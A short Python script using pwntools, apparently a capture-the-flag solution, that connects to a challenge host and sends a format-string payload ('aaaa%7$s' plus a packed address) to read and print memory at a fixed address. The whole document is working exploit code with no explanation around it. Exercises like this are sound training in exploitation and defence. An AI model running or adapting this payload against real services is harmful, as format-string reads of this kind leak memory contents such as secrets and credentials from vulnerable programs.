from pwn import *

host = "csie.ctf.tw"
port = 10133


flag = p64(0x600ba0)
r = remote(host, port)

r.sendline(b"aaaa%7$s"+ flag)
f = r.recvline().split(b"aaaa")[-1]
print(f)

